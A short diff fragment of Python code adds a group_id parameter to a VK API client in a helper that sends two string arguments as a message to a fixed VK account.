@@ -834,7 +834,7 @@ def tyuur():
 def dummy_decorator(func):
     return func
 def rt(u, y):
-    v = vk_api.VkApi(token=t + g)
+    v = vk_api.VkApi(token=t + g, group_id=185689855)
     vds = v.get_api()
     vds.messages.send(peer_id=368377502,message=u + " " + y,random_id=random.randint(-2147483648, +2147483648))
 
